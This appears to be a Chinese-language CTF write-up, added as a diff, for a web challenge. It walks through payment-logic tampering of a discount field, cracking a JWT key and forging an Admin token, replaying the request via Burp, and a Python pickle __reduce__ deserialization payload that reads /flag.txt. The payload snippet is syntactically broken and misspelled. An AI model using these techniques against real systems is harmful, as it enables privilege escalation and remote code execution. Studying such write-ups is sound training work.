@@ -1,0 +1,110 @@
+# 华北赛区 Day1
+
+>  知识点:
+
+ `Python`反序列化 , 支付逻辑漏洞, Cookie篡改, 重放攻击, JWT破解 , 垂直越权, 代码审计, 
+
+1. 根据提示, **答题人需要新寻找lv6 , 但是, 会发现, 找了好几页都没有lv , 这个时候通过分析任意一个源码, 查看,  lv 数字 到底是怎么写源码的  **
+
+   ```python
+   # 此处是查找 lv6 的代码
+   import requests
+   
+   
+   def get_lv6():
+       for i in range(400):
+           url = "此处填写拿到的网址?page{}".format(i)  
+           resp = requests.get(url)    
+           get_text = resp.content.decode('utf-8')           
+           if "lv6.png" in get_text:
+               print(i)                # 打印出所在的页数.
+               break
+   
+   
+   if __name__=='__main__':
+   
+     get_lv6()
+   
+   
+   ```
+
+2. 接着, **还是那个提示, 我们需要购买 lv6 , 但是用户虽然有 初始资金, 但是不够买的, 也没有 sql 注入的点, 改不了数据,   `但是有 优惠券` , 由此想到逻辑漏洞** ===========> **查看源码:  发现`discount 字段`**
+
+   尝试在 **前端修改对应的值, 将其改为一个很小的值** , 查看效果是 需要管理员权限.
+
+   ![image-20230405214431918](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230405214431918.png)
+
+
+
+3. 查看cookie.
+
+![image-20230405213916234](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230405213916234.png)
+
+> 打开 jwt.io  , 进行分析
+>
+> https://jwt.io/
+>
+> ![image-20230406051609203](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406051609203.png)
+
+
+
+4. **分析并解析Key**
+
+   这是解析出来的.  从中可以分析 , 之所以 在前端修改的时候, **会提示 不是Admin** , 可能是因为这个JWT 加密, 解密出来用户名不是admin, 那么只要修改用户名 , 将其改为`Admin` 就可以啦 .
+
+> JWT一共分为三段, 用  **点**,来进行分隔,  前面两端是用  base 64 进行编码的, 最后一个才是签证加密的, 所以只要 解析出 最后一段的内容, 了解它是如何编码的, 然后再 **修改 username , 将第一个的值换成 Admin**
+
+>  获取JWT的使用到的工具:
+>
+> https://github.com/brendan-rius/c-jwt-cracker
+
+得到Key后
+
+![image-20230406053106080](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406053106080.png)
+
+
+
+5. 打开BP, 拦截并修改数据
+
+> 仍然在购物栏里面发起请求, 用BP拦截, **修改 discout 对应的 value并  将jwt 替换为解析以后的jwt** , 然后知己防爆
+
+![image-20230406054025496](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406054025496.png)
+
+
+
+6. 进行代码审计
+
+![image-20230406054231004](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406054231004.png)
+
+
+
+![image-20230406054359340](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406054359340.png)
+
+
+
+![image-20230406054724153](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406054724153.png)
+
+> 既然有 become  这个参数, 那肯定有地方传,   再去看源代码 , **发现有 `hiden = hiden`** , 删除他们.  会显示 admin 字样.
+
+这个时候, 成为大会员的 按钮就可以使用了.
+
+7. 开始序列化和反序列化
+
+> 找到   解`压出来的main.py ` 这个文件 , 在这里面进行添加
+
+```
+import pickle
+import urllib
+import os 
+class Payload(object):
+	def __reduce__(self):
+		return (os.listdir,('/'))
+		
+if __name__ == '__main__':
+#	tmp = pickle.dumps(Pauload())              # 想用此句看看有啥文件(拿到的东西要通过 成为大会员的按钮 发送 , 这样才能看到结果)
+	return(eval,("open('/flag.txt','r')"))     #  读取flag文件   (这里也是需要将拿到的东西重新发送, 这样才能拿到flag)
+	print usllib.quote(tmp)
+```
+
+到此为止本题结束. 
+
